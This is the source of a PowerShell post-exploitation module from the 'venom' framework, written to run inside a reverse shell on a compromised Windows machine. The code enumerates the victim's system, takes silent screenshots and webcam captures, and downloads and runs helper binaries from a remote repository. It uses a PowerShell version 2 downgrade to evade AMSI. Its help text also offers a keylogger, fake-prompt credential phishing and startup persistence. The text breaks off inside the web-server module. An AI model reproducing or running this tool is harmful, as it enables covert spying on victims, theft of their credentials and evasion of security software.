<#
.SYNOPSIS
   CmdLet to assiste reverse tcp shells in post-exploitation

   Author: r00t-3xp10it
   Tested Under: Windows 10 x64 bits
   Required Dependencies: none
   Optional Dependencies: BitsTransfer
   PS cmdlet Dev version: v1.0.2

.DESCRIPTION
   This cmdlet belongs to the structure of venom v1.0.17.8 as a post-exploitation module.
   venom amsi evasion agents automatically downloads this CmdLet to %TMP% directory to be
   easily accessible in our reverse tcp shell (shell prompt). So, we just need to run this
   CmdLet with the desired parameters to perform various remote actions such as:
   
   System Enumeration, Start Local WebServer to read/browse/download files, Capture desktop
   screenshots, Capture Mouse/Keyboard Clicks/Keystrokes, Upload Files, Scans for EoP entrys,
   Persiste Agents on StartUp using 'beacon home' from 'xx' to 'xx' seconds technic, Etc ..

.NOTES
   blablabla

.EXAMPLE
   PS C:\> Get-Help .\MyMeterpreter.ps1 -full
   Access This CmdLet Comment_Based_Help

.EXAMPLE
   PS C:\> .\MyMeterpreter.ps1 -Parameters List
   List Some CmdLet Parameters Available

.EXAMPLE
   PS C:\> .\MyMeterpreter.ps1 -SysInfo Enum|Verbose
   SystemInfo Fast OR Detailed Enumeration

.EXAMPLE
   PS C:\> .\MyMeterpreter.ps1 -GetConnections Enum
   Enumerate Remote Host Active TCP Connections

.EXAMPLE
   PC C:\> .\MyMeterpreter.ps1 -GetInstalled Enum
   Enumerate Remote Host Applications Installed

.EXAMPLE
   PC C:\> .\MyMeterpreter.ps1 -GetProcess Enum|Kill
   Enumerate OR Kill Remote Host Running Process(s)

.EXAMPLE
   PC C:\> .\MyMeterpreter.ps1 -GetProcess Enum|Kill -ProcessName firefox.exe
   Enumerate OR Kill Remote Host firefox.exe Process(s)

.EXAMPLE
   PS C:\> .\MyMeterpreter.ps1 -GetTasks Enum
   Enumerate Remote Host Running Tasks

.EXAMPLE
   PS C:\> .\MyMeterpreter.ps1 -GetBrowsers Enum|ScanAll
   Identify Installed Browsers and Versions OR ScanAll (Enum)

.EXAMPLE
   PS C:\> .\MyMeterpreter.ps1 -Screenshot 1
   Capture 1 Desktop Screenshot and Store it on %TMP%

.EXAMPLE
   PS C:\> .\MyMeterpreter.ps1 -Screenshot 5 -Delay 2
   Capture 5 Desktop Screenshots with 2 secs delay between captures.

.EXAMPLE
   PS C:\> .\MyMeterpreter.ps1 -Camera Enum|Snap
   List Device Names OR take screenshot with default camera

.EXAMPLE
   PS C:\> .\MyMeterpreter.ps1 -StartWebServer Python
   Downloads webserver.ps1 to %TMP% and executes the WebServer.
   Remark: This Module uses Social Enginnering to trick remote host into
   installing python (python http.server) if remote host does not have it.
   Access WebServer: http://<RHOST>:8080/

.EXAMPLE
   PS C:\> .\MyMeterpreter.ps1 -StartWebServer Python -SPort 8087
   Downloads webserver.ps1 and executes the webserver on port 8087
   Access WebServer: http://<RHOST>:8087/

.EXAMPLE
   PS C:\> .\MyMeterpreter.ps1 -StartWebServer Powershell
   Downloads Start-WebServer.ps1 to %TMP% and executes the webserver.
   Remark: Admin privileges are requiered in shell to run the WebServer
   Access WebServer: http://<RHOST>:8080/

.EXAMPLE
   PS C:\> .\MyMeterpreter.ps1 -StartWebServer Powershell -SPort 8087
   Downloads Start-WebServer.ps1 and executes the webserver on port 8087
   Remark: Admin privileges are requiered in shell to run the WebServer
   Access WebServer: http://<RHOST>:8087/

.EXAMPLE
   PS C:\> .\MyMeterpreter.ps1 -Keylogger Start|Stop
   Download/Execute void.exe in child process to capture keystrokes
   OR Stops keylogger and delete all respective files\logs left behind.

.EXAMPLE
   PS C:\> .\MyMeterpreter.ps1 -Mouselogger Start -Timmer 10
   Capture Screenshots of remote Mouse Clicks for 10 seconds
   And store the capture under '$Env:TMP' remote directory.

.EXAMPLE
   PS C:\> .\MyMeterpreter.ps1 -PhishCreds Start
   Promp the current user for a valid credential.
   Remark: This CmdLet interrupts EXPLORER process until a valid credential
   is entered correctly in Windows PromptForCredential MsgBox, only them it
   starts EXPLORER process and leaks the credentials on this terminal shell.

.EXAMPLE
   PS C:\> .\MyMeterpreter.ps1 -EOP Default|ScanAll
   Find Missing Software Patchs for Privilege Escalation

.EXAMPLE
   PS C:\> .\MyMeterpreter.ps1 -Persiste $Env:USERPROFILE\Coding\PSwork\Client.ps1 -BeaconTime 10
   Execute Client.ps1 at StartUp with 10 sec of interval between executions

.EXAMPLE
   PS C:\> .\MyMeterpreter.ps1 -Persiste Stop
   Stops wscript process (vbs) and delete persistence script

.EXAMPLE
   PS C:\> .\MyMeterpreter.ps1 -Upload FileName.ps1 -ApacheAddr 192.168.1.73 -Destination $Env:TMP\FileName.ps1
   Downloads FileName.ps1 script from attacker apache2 (192.168.1.73) into $Env:TMP\FileName.ps1 Local directory

.INPUTS
   None. You cannot pipe objects into MyMeterpreter.ps1

.OUTPUTS
   OS: Microsoft Windows 10 Home
   -----------------------------
   ShellPrivs   : UserLand
   Domain       : SKYNET
   Arch         : 64 bits
   Version      : 10.0.18363
   Address      : 192.168.1.72
   System32     : C:\WINDOWS\system32
   WorkingDir   : C:\Users\pedro\AppData\Local\Temp
   Processor    : AMD64 Family 21 Model 101 Stepping 1

.LINK
    https://github.com/r00t-3xp10it/venom
    https://github.com/r00t-3xp10it/venom/tree/master/aux/Sherlock.ps1
    https://github.com/r00t-3xp10it/venom/tree/master/aux/webserver.ps1
    https://github.com/r00t-3xp10it/venom/tree/master/aux/MyMeterpreter.ps1
    https://github.com/r00t-3xp10it/venom/tree/master/aux/Start-WebServer.ps1
    https://github.com/r00t-3xp10it/venom/blob/master/bin/meterpeter/mimiRatz/CredsPhish.ps1
#>

## TODO:
# fazer o download deste script para %tmp% usando o dropper
# Assim o utilizador so tem the chamar este script na rev tcp shell
# Shell Options: Get-Help .\MyMeterpreter.ps1 -full


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$StartWebServer="false",
   [string]$GetConnections="false",
   [string]$GetInstalled="false",
   [string]$Mouselogger="false",
   [string]$Destination="false",
   [string]$GetBrowsers="false",
   [string]$ProcessName="false",
   [string]$Parameters="false",
   [string]$PhishCreds="false",
   [string]$GetProcess="false",
   [string]$ApacheAddr="false",
   [string]$Keylogger="false",
   [string]$GetTasks="false",
   [string]$Persiste="false",
   [string]$SysInfo="false",
   [string]$Upload="false",
   [string]$Camera="false",
   [string]$EOP="false",
   [int]$BeaconTime='10',
   [int]$Screenshot='0',
   [int]$SPort='8080',
   [int]$Timmer='10',
   [int]$Delay='1'
)


## Variable declarations
$CmdletVersion = "v1.0.2"
$Remote_hostName = (hostname)
$Working_Directory = (pwd).Path
$host.UI.RawUI.WindowTitle = "@MyMeterpreter $CmdletVersion {SSA@RedTeam}"
$Address = (Test-Connection -ComputerName (hostname) -Count 1).IPV4Address.IPAddressToString
$Banner = @"

                  * Reverse TCP Shell Auxiliary Powershell Module *
 __  __ __  __ __  __  ____  _____  ____  ____  ____  ____  ____  _____  ____  ____ 
|  \/  |\ \/ /|  \/  || ===||_   _|| ===|| () )| ()_)| () )| ===||_   _|| ===|| () )
|_|\/|_| |__| |_|\/|_||____|  |_|  |____||_|\_\|_|   |_|\_\|____|  |_|  |____||_|\_\    
              Author: r00t-3xp10it - SSAredTeam @2021 - Version: $CmdletVersion
                   CmdLet Help: .\MyMeterpreter.ps1 -Parameters List

      
"@;
Clear-Host
Write-Host "$Banner" -ForegroundColor Blue


<# TODO:

.SYNOPSIS
   Clean files\temp

.EXAMPLE
   PS C:\> .\MyMeterpreter.ps1 -CleanTracks True



.SYNOPSIS
   Dump Wifi SSID passwords ???
   .\SSIDPassDump.ps1 -DumpType Terminal

.EXAMPLE
   PS C:\> .\MyMeterpreter.ps1 -WifiPasswords Enum|Dump


   cmd /R start /max microsoft-edge:https://mrdoob.com/projects/chromeexperiments/google-sphere

   ## Speak Frase: '$MYSpeak' Remotely
   $My_Line = "$MYSpeak"
   Add-Type -AssemblyName System.speech
   $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer
   $speak.Volume = 85;$speak.Rate = -2
   $speak.Speak($My_Line)
#>

If($Parameters -ieq "List"){

   <#
   .SYNOPSIS
      Helper - List CmdLet Parameters Available
      
   .EXAMPLE
      PS C:\> .\MyMeterpreter.ps1 -Parameters List
   #>

Write-Host "  Syntax : .\MyMeterpreter.ps1 [ -Parameter ] [ Argument ]"
Write-Host "  Example: .\MyMeterpreter.ps1 -SysInfo Verbose -Screenshot 2 -Delay 5`n"
Write-Host "  Parameters        Arguments            Description" -ForegroundColor Green
Write-Host "  ---------------   ------------         ---------------------------------------"
$ListParameters = @"
  -SysInfo          Enum|Verbose         SystemInfo Fast OR Detailed Enumeration
  -GetConnections   Enum                 Enumerate Remote Host Active TCP Connections
  -GetInstalled     Enum                 Enumerate Remote Host Applications Installed
  -GetProcess       Enum|Kill            Enumerate OR Kill Remote Host Running Process(s)
  -ProcessName      firefox.exe          Used together with [ -GetProcess Enum|Kill ]
  -GetTasks         Enum                 Enumerate Remote Host Running Tasks
  -GetBrowsers      Enum|ScanAll         Enumerate Installed Browsers and Versions OR ScanAll 
  -Screenshot       1                    Capture 1 Desktop Screenshot and Store it on %TMP%
  -Delay            2                    Used together with [ -Screenshot 1|2|3|4|etc ] switch
  -Camera           Enum|Snap            Enum computer cameras OR capture default camera screenshot 
  -StartWebServer   Python|Powershell    Downloads webserver to %TMP% and executes the WebServer.
  -SPort            8080                 Used together with [ -StartWebServer Python|Powershell ]
  -Keylogger        Start|Stop           Start OR Stop recording remote host keystrokes
  -MouseLogger      Start                Capture Screenshots of Mouse Clicks for 10 seconds
  -Timmer           10                   Used together with [ -MouseLogger Start ] switch
  -PhishCreds       Start                Promp current user for a valid credential and leak captures
  -EOP              Default|ScanAll      Find Missing Software Patchs for Privilege Escalation
  -WifiPasswords    Enum|Dump            Enum Available SSIDs OR Dump all Wifi SSID passwords
  -Upload           script.ps1           Upload script.ps1 from attacker apache2 webroot
  -ApacheAddr       192.168.1.73         Used together with [ -Upload script.ps1 ] switch
  -Destination      `$Env:TMP\script.ps1  Used together with [ -Upload script.ps1 ] switch
  -Persiste         `$Env:TMP\script.ps1  Persiste script.ps1 on every startup (BeaconHome)
  -BeaconTime       10                   Used together with [ -Persiste ] switch (BeaconTime)

"@;
Write-Host "$ListParameters"
}

If($SysInfo -ieq "Enum" -or $SysInfo -ieq "Verbose"){## <-- TODO: finish Verbose @Argument

   <#
   .SYNOPSIS
      Helper - SysInfo module enumerates remote host
      basic system info sutch as: IpAddress, OsVersion
      OsFlavor, OsArchitecture, WorkingDirectory, Etc..

   .EXAMPLE
      PS C:\> .\MyMeterpreter.ps1 -SysInfo Enum
      Remote Host Fast Enumeration Module

   .EXAMPLE
      PS C:\> .\MyMeterpreter.ps1 -SysInfo Verbose
      Remote Host Detailed Enumeration Module
   #>

   ## Variable declarations
   $Name = (Get-WmiObject Win32_OperatingSystem).CSName
   $Processor = (Get-WmiObject Win32_processor).Caption
   $System = (Get-WmiObject Win32_OperatingSystem).Caption
   $Version = (Get-WmiObject Win32_OperatingSystem).Version
   $syst_dir = (Get-WmiObject Win32_OperatingSystem).SystemDirectory
   $Architecture = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
   $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544");
   If($IsClientAdmin){$ShellPrivileges = "Admin"}Else{$ShellPrivileges = "UserLand"}

   ## Build OutPut Table
   Write-Host "  OS: $System" -ForegroundColor Green
   Write-Host "  -----------------------------";Start-Sleep -Seconds 1
   Write-Host "  ShellPrivs   : $ShellPrivileges" -ForegroundColor Yellow
   Write-Host "  DomainName   : $Name"
   Write-Host "  Architecture : $Architecture"
   Write-Host "  OSVersion    : $Version"
   Write-Host "  IPAddress    : $Address"
   Write-Host "  System32     : $syst_dir"
   Write-Host "  WorkingDir   : $Working_Directory" -ForegroundColor Yellow
   Write-Host "  Processor    : $Processor"


   ## Detailed Enumeration function
   If($SysInfo -ieq "Verbose"){## <---- TODO:
      Write-Host ""
      Start-Sleep -Seconds 1
      Write-Host "[i] Under Develop ..."
   }
   Write-Host "";Start-Sleep -Seconds 1
}

If($GetConnections -ieq "Enum"){

   <#
   .SYNOPSIS
      Helper - Enumerate Active TCP Connections
      
   .EXAMPLE
      PS C:\> .\MyMeterpreter.ps1 -GetConnections Enum
   #>

   Write-Host "  $Remote_hostName Active TCP Connections" -ForegroundColor Green
   Write-Host "  -----------------------------`n";Start-Sleep -Seconds 1
   Write-Host "  Proto  Local                  Remote                 Status          PID"
   Write-Host "  -----  -----                  ------                 ------          ---"
   cmd.exe /c netstat -ano|findstr /C:"ESTABLISHED"|findstr /V "["
   Write-Host "";Start-Sleep -Seconds 1
}

If($GetInstalled -ieq "Enum"){

   <#
   .SYNOPSIS
     Helper - List Remote Host Applications installed

   .EXAMPLE
      PC C:\> .\MyMeterpreter.ps1 -GetInstalled Enum
   #>

   Write-Host "$Remote_hostName Applications installed" -ForegroundColor Green
   Write-Host "-----------------------------";Start-Sleep -Seconds 1
   Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*|Select-Object DisplayName,DisplayVersion|Format-Table -AutoSize
   Start-Sleep -Seconds 1
}

If($GetProcess -ieq "Enum" -or $GetProcess -ieq "Kill"){

   <#
   .SYNOPSIS
     Helper - Enumerate/Kill Running Process

   .EXAMPLE
      PC C:\> .\MyMeterpreter.ps1 -GetProcess Enum
      Enumerate Remote Host Running Process(s)

   .EXAMPLE
      PC C:\> .\MyMeterpreter.ps1 -GetProcess Enum -ProcessName firefox.exe
      Enumerate Remote Host firefox.exe Process(s)

   .EXAMPLE
      PC C:\> .\MyMeterpreter.ps1 -GetProcess Kill -ProcessName firefox.exe
      Kill Remote Host firefox.exe Running Process
   #>

   ## Syntax Examples
   Write-Host "Syntax Examples" -ForegroundColor Green
   Write-Host "Example: .\MyMeterpreter.ps1 -GetProcess Enum"
   Write-Host "Example: .\MyMeterpreter.ps1 -GetProcess Enum -ProcessName notepad.exe"
   Write-Host "Example: .\MyMeterpreter.ps1 -GetProcess Kill -ProcessName notepad.exe`n"
   Start-Sleep -Seconds 2

   If($GetProcess -ieq "Enum" -and $ProcessName -ieq "false"){## Enumerate ALL running process(s)
      Write-Host "$Remote_hostName Running Process" -ForegroundColor Green
      Write-Host "----------------------";Start-Sleep -Seconds 1
      Get-Process -EA SilentlyContinue|Select-Object Name,Path,Company,StartTime,Responding|Where-Object { $_.Responding -Match "True" -and $_.StartTime -ne $null}
   }ElseIf($GetProcess -ieq "Enum" -and $ProcessName -ne "false"){## Enumerate User Inpur ProcessName
      $RawProcName = $ProcessName -replace '.exe','' ## Replace .exe in processname to be abble use Get-Process
      Write-Host "$Remote_hostName $ProcessName Process" -ForegroundColor Green
      Write-Host "---------------------------";Start-Sleep -Seconds 1
      $CheckProc = Get-Process $RawProcName -EA SilentlyContinue|Select-Object Id,Name,Description,ProductVersion,Path,Company,StartTime,HasExited,Responding
      If(-not($CheckProc)){## User Input => ProcessName NOT found
         Write-Host "[error] $ProcessName NOT found running!" -ForegroundColor Red -BackgroundColor Black
         Start-Sleep -Seconds 1
      }Else{## User Input => ProcessName found report
         echo $CheckProc > $Env:TMP\CheckProc.log
         Get-Content -Path $Env:TMP\CheckProc.log
         Remove-Item -Path $Env:TMP\CheckProc.log -Force
      }

   }ElseIf($GetProcess -ieq "Kill"){## Kill User Input => Running Process
      If($ProcessName -ieq $null -or $ProcessName -ieq "false"){## Make sure ProcessName Mandatory argument its set
        Write-Host "[error] -ProcessName Mandatory Parameter Required!" -ForegroundColor Red -BackgroundColor Black
        Write-Host "syntax: .\MyMeterpreter.ps1 -GetProcess Kill -ProcessName firefox.exe"
        Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @MyMeterpreter
      }

      ## Make sure ProcessName its running
      $RawProcName = $ProcessName -replace '.exe',''
      $MSPIR = (Get-Process $RawProcName -EA SilentlyContinue).Responding|Select-Object -First 1
      If($MSPIR -ieq "True"){## ProcessName found => Responding
         If(-not($ProcessName -Match "[.exe]$")){## Add extension required (.exe) by taskkill cmdline
            $ProcessName = "$ProcessName"+".exe" -join ''
         }
         cmd.exe /R taskkill /F /IM $ProcessName
      }Else{## ProcessName NOT found responding
         Write-Host "[error] $ProcessName Process Name NOT found!" -ForegroundColor Red -BackgroundColor Black
         Start-Sleep -Seconds 1
      }
   }
   Write-Host "";Start-Sleep -Seconds 1
}

If($GetTasks -ieq "Enum"){

   <#
   .SYNOPSIS
     Helper - Enumerate Remote Host Running Tasks

   .EXAMPLE
      PS C:\> .\MyMeterpreter.ps1 -GetTasks Enum
   #>

   Write-Host "$Remote_hostName Running Tasks" -ForegroundColor Green
   Write-Host "-------------------`n"
   Start-Sleep -Seconds 1
   Write-Host "TaskName                                 Next Run Time          Status"
   Write-Host "--------                                 -------------          ------"
   cmd.exe /R schtasks|findstr /I "Ready Running"
   Write-Host "";Start-Sleep -Seconds 1
}

If($GetBrowsers -ieq "Enum" -or $GetBrowsers -ieq "ScanAll"){

   <#
   .SYNOPSIS
      Helper - Leak Installed Browsers Information

   .NOTES
      This module downloads GetBrowsers.ps1 from venom
      GitHub repository into remote host %TMP% directory,
      And identify install browsers and run enum modules.

   .EXAMPLE
      PS C:\> .\MyMeterpreter.ps1 -GetBrowsers Enum
      Identify installed browsers and versions

   .EXAMPLE
      PS C:\> .\MyMeterpreter.ps1 -GetBrowsers ScanAll
      Run enumeration modules againts ALL installed browsers
   #>

   If(-not(Test-Path -Path "$Env:TMP\GetBrowsers.ps1")){## Download GetBrowsers.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/bin/meterpeter/mimiRatz/GetBrowsers.ps1 -Destination $Env:TMP\GetBrowsers.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\GetBrowsers.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 58){## Corrupted download detected => DefaultFileSize: 58,1474609375/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\GetBrowsers.ps1"){Remove-Item -Path "$Env:TMP\GetBrowsers.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @MyMeterpreter
      }   
   }

   ## Detect ALL Available browsers Installed { IE, FIREFOX, CHROME }
   $IEVersion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer" -EA SilentlyContinue).version
   If($IEVersion){$IEfound = "Installed"}else{$IEfound = "NotFound"}
   $Chrome_App = (Get-ItemProperty "HKCU:\Software\Google\Chrome\BLBeacon" -EA SilentlyContinue).version
   If($Chrome_App){$CHfound = "Installed"}else{$CHfound = "NotFound"}
   $FFfound = (Get-Process firefox -ErrorAction SilentlyContinue)
   If($FFfound){$FFfound = "Installed"}else{$FFfound = "NotFound"}

   ## Run sellect modules againts installed browsers
   If($GetBrowsers -ieq "Enum"){## [ Enum ] @arg scans
      &"$Env:TMP\GetBrowsers.ps1" -RECON
   }Else{## [ ScanAll ] @arg scans

      &"$Env:TMP\GetBrowsers.ps1" -RECON
      If($IEfound -ieq "Installed"){## IExplorer Found
         &"$Env:TMP\GetBrowsers.ps1" -IE
      }

      If($CHfound -ieq "Installed"){## Chrome Found
         &"$Env:TMP\GetBrowsers.ps1" -CHROME
      }

      If($FFfound -ieq "Installed"){## Firefox Found
         If(-not(Test-Path "$Env:TMP\mozlz4-win32.exe")){## Downloads binary auxiliary 
            Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/bin/meterpeter/mimiRatz/mozlz4-win32.exe -Destination $Env:TMP\mozlz4-win32.exe -ErrorAction SilentlyContinue|Out-Null
            ## Check downloaded file integrity => FileSizeKBytes
            $SizeDump = ((Get-Item -Path "$Env:TMP\mozlz4-win32.exe" -EA SilentlyContinue).length/1KB)
            If($SizeDump -lt 669){## Corrupted download detected => DefaultFileSize: 669,5/KB
               Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
               If(Test-Path -Path "$Env:TMP\mozlz4-win32.exe"){Remove-Item -Path "$Env:TMP\mozlz4-win32.exe" -Force}
            }
         }
         ## Execute GetBrowsers -FIREFOX parameter
         &"$Env:TMP\GetBrowsers.ps1" -FIREFOX
      }
   }
   ## Clean Old Files
   If(Test-Path -Path "$Env:TMP\mozlz4-win32.exe"){Remove-Item -Path "$Env:TMP\mozlz4-win32.exe" -Force}
   If(Test-Path -Path "$Env:TMP\GetBrowsers.ps1"){Remove-Item -Path "$Env:TMP\GetBrowsers.ps1" -Force}
   Start-Sleep -Seconds 1
}

If($Screenshot -gt 0){
$Limmit = $Screenshot+1 ## The number of screenshots to be taken
If($Delay -lt '1'){$Delay = '1'} ## Screenshots delay time minimum value accepted

   <#
   .SYNOPSIS
      Helper - Capture Remote Desktop Screenshot(s)

   .EXAMPLE
      PS C:\> .\MyMeterpreter.ps1 -Screenshot 1
      Capture 1 desktop screenshot and store it on %TMP%.

   .EXAMPLE
      PS C:\> .\MyMeterpreter.ps1 -Screenshot 5 -Delay 2
      Capture 5 desktop screenshots with 2 secs delay between captures.
   #>

   ## Syntax Examples
   Write-Host "Syntax Examples" -ForegroundColor Green
   Write-Host "Example: .\MyMeterpreter.ps1 -Screenshot 1"
   Write-Host "Example: .\MyMeterpreter.ps1 -Screenshot 3 -Delay 10`n"
   Start-Sleep -Seconds 1

   ## Create Data Table for output
   $mytable = New-Object System.Data.DataTable
   $mytable.Columns.Add("ScreenCaptures")|Out-Null
   $mytable.Columns.Add("Delay")|Out-Null
   $mytable.Columns.Add("Storage")|Out-Null
   $mytable.Rows.Add("$Screenshot",
                     "$Delay(sec)",
                     "$Env:TMP")|Out-Null

   ## Display Data Table
   $mytable|Format-Table -AutoSize > $Env:TMP\MyTable.log
   Get-Content -Path "$Env:TMP\MyTable.log"
   Remove-Item -Path "$Env:TMP\MyTable.log" -Force


   ## Loop Function to take more than one screenshot.
   For($num = 1 ; $num -le $Screenshot ; $num++){

      $OutPutPath = "$Env:TMP"
      $Dep = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 5 |%{[char]$_})
      $FileName = "$Env:TMP\Capture-"+"$Dep.png"
      If(-not(Test-Path "$OutPutPath")){New-Item $OutPutPath -ItemType Directory -Force}
      Add-Type -AssemblyName System.Windows.Forms
      Add-type -AssemblyName System.Drawing
      $ASLR = [System.Windows.Forms.SystemInformation]::VirtualScreen
      $Height = $ASLR.Height;$Width = $ASLR.Width
      $Top = $ASLR.Top;$Left = $ASLR.Left
      $Console = New-Object System.Drawing.Bitmap $Width, $Height
      $AMD = [System.Drawing.Graphics]::FromImage($Console)
      $AMD.CopyFromScreen($Left, $Top, 0, 0, $Console.Size)
      $Console.Save($FileName) 

      Write-Host "$num Saved: $FileName" -ForegroundColor Yellow
      Start-Sleep -Seconds $Delay; ## 2 seconds delay between screenshots (default value)
   }
   Write-Host "";Start-Sleep -Seconds 1
}

If($Camera -ieq "Enum" -or $Camera -ieq "Snap"){

   <#
   .SYNOPSIS
      List computer cameras or capture camera screenshot

   .NOTES
      Remark: WebCam turns the ligth ON taking snapshots.
      Using -Camera Snap @argument migth trigger AV detection
      Unless target system has powershell version 2 available.
      In that case them PS version 2 will be used to execute
      our binary file and bypass AV amsi detection.

   .EXAMPLE
      PS C:\> .\MyMeterpreter.ps1 -Camera Enum
      List WebCams Device Names available

   .EXAMPLE
      PS C:\> .\MyMeterpreter.ps1 -Camera Snap
      Take one screenshot using default camera
   #>

   ## Download CommandCam binary if not exist
   If(-not(Test-Path -Path "$Env:TMP\CommandCam.exe")){## Download CommandCam.exe from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/bin/meterpeter/mimiRatz/CommandCam.exe -Destination $Env:TMP\CommandCam.exe -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\CommandCam.exe" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 132){## Corrupted download detected => DefaultFileSize: 132/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\CommandCam.exe"){Remove-Item -Path "$Env:TMP\CommandCam.exe" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @MyMeterpreter
      }   
   }


   If($Camera -ieq "Enum"){

      ## AMSI Bypass execution function
      $CheckBypass = powershell -version 2 -C Get-Host -EA SilentlyContinue
      If($CheckBypass -Match '2.0'){## PS version 2 found
         $SnapTimer = Get-Date -Format 'HH:mm:ss';cd $Env:TMP
         Write-Host "[i] PS version 2 execution (amsi bypass)" -ForegroundColor Yellow
         powershell -version 2 .\CommandCam.exe /devlist > $Env:TMP\CC.log
         cd $Working_Directory ## Return to @MyMeterpreter Working Directory
      }Else{## Remote Host without PS v2 available
         cd $Env:TMP
         $SnapTimer = Get-Date -Format 'HH:mm:ss'
         .\CommandCam.exe /devlist > $Env:TMP\CC.log
         cd $Working_Directory ## Return to @MyMeterpreter Working Directory
      }

      ## Parsing Camera Data
      If(Test-Path -Path "$Env:TMP\CC.log"){## Check for logfile existence
         $ParseData = Get-Content -Path "$Env:TMP\CC.log"|findstr /C:"Device name:"
         $StripPoints = $ParseData -split(":") ## Split report into two arrays
         ## Replace empty spaces in 'Beggining' and 'End' of string
         $DeviceCapture = $StripPoints[1] -replace '(^\s+|\s+$)',''
         Remove-Item -Path "$Env:TMP\CC.log" -Force
      }Else{## Error CC.log NOT found
         $DeviceCapture = "Fail to retrieve Device Name!"
      }

      ## Create Data Table for output
      $mytable = New-Object System.Data.DataTable
      $mytable.Columns.Add("StartTime")|Out-Null
      $mytable.Columns.Add("ProcessName")|Out-Null
      $mytable.Columns.Add("DeviceName")|Out-Null
      $mytable.Rows.Add("$SnapTimer",
                        "CommandCam",
                        "$DeviceCapture")|Out-Null

      ## Display Data Table
      $mytable|Format-Table -AutoSize > $Env:TMP\KeyDump.log
      Get-Content -Path "$Env:TMP\KeyDump.log"
      Remove-Item -Path "$Env:TMP\KeyDump.log" -Force


   }ElseIf($Camera -ieq "Snap"){## Take SnapShot with default Camera


      ## AMSI Bypass execution function
      $CheckBypass = powershell -version 2 -C Get-Host -EA SilentlyContinue
      If($CheckBypass -Match '2.0'){## PS version 2 found
         $SnapTimer = Get-Date -Format 'HH:mm:ss';cd $Env:TMP
         Write-Host "[i] PS version 2 execution (amsi bypass)" -ForegroundColor Yellow
         powershell -version 2 .\CommandCam.exe /quiet
         cd $Working_Directory ## Return to @MyMeterpreter Working Directory
      }Else{## Remote Host without PS v2 available
         cd $Env:TMP
         $SnapTimer = Get-Date -Format 'HH:mm:ss'
         .\CommandCam.exe /quiet
         cd $Working_Directory ## Return to @MyMeterpreter Working Directory
      }

      ## Make sure image.bmp exist
      If(Test-Path -Path "$Env:TMP\image.bmp"){
         $Cap = "$Env:TMP\image.bmp"
      }Else{## Image.bmp NOT found
         $Cap = "Fail to take screenshot!"
      }

      ## Create Data Table for output
      $mytable = New-Object System.Data.DataTable
      $mytable.Columns.Add("StartTime")|Out-Null
      $mytable.Columns.Add("ProcessName")|Out-Null
      $mytable.Columns.Add("Capture")|Out-Null
      $mytable.Rows.Add("$SnapTimer",
                        "CommandCam",
                        "$Cap")|Out-Null

      ## Display Data Table
      $mytable|Format-Table -AutoSize > $Env:TMP\KeyDump.log
      Get-Content -Path "$Env:TMP\KeyDump.log"
      Remove-Item -Path "$Env:TMP\KeyDump.log" -Force
   }

   ## Clean OLd files
   If(Test-Path -Path "$Env:TMP\CommandCam.exe"){
      Remove-Item -Path "$Env:TMP\CommandCam.exe" -Force
   }
   If(Test-Path -Path "$Env:TMP\test.log"){
      Remove-Item -Path "$Env:TMP\test.log" -Force
   }
   Write-Host "";Start-Sleep -Seconds 1
}

If($StartWebServer -ieq "Python" -or $StartWebServer -ieq "Powershell"){

   <#
   .SYNOPSIS
      Helper - Start Local HTTP WebServer (Background)

   .NOTES
      Access WebServer: http://<RHOST>:8080/
      This module download's webserver.ps1 or Start-WebServer.ps1
      to remote host %TMP% and executes it on an hidden terminal prompt
      to allow users to silent browse/read/download files from remote host.

   .EXAMPLE
      PS C:\> .\MyMeterpreter.ps1 -StartWebServer Python
      Downloads webserver.ps1 to %TMP% and executes the webserver.
      Remark: This Module uses Social Enginnering to trick remote host into
      installing python (python http.server) if remote host does not have it.

   .EXAMPLE
      PS C:\> .\MyMeterpreter.ps1 -StartWebServer Python -SPort 8087
      Downloads webserver.ps1 and executes the webserver on port 8087

   .EXAMPLE
      PS C:\> .\MyMeterpreter.ps1 -StartWebServer Powershell
      Downloads Start-WebServer.ps1 and executes the webserver.
      Remark: Admin privileges are requiered in shell to run the WebServer

   .EXAMPLE
      PS C:\> .\MyMeterpreter.ps1 -StartWebServer Powershell -SPort 8087
      Downloads Start-WebServer.ps1 and executes the webserver on port 8087
      Remark: Admin privileges are requiered in shell to run the WebServer
   #>

   ## Syntax Examples
   Write-Host "Syntax Examples" -ForegroundColor Green
   Write-Host "Example: .\MyMeterpreter.ps1 -StartWebServer Python"
   Write-Host "Example: .\MyMeterpreter.ps1 -StartWebServer Powershell"
   Write-Host "Example: .\MyMeterpreter.ps1 -StartWebServer Python -SPort 8087"
   Write-Host "Example: .\MyMeterpreter.ps1 -StartWebServer Powershell -SPort 8087`n"
   Start-Sleep -Seconds 2

   ## Chose what WebServer to use (Python|Powershell)
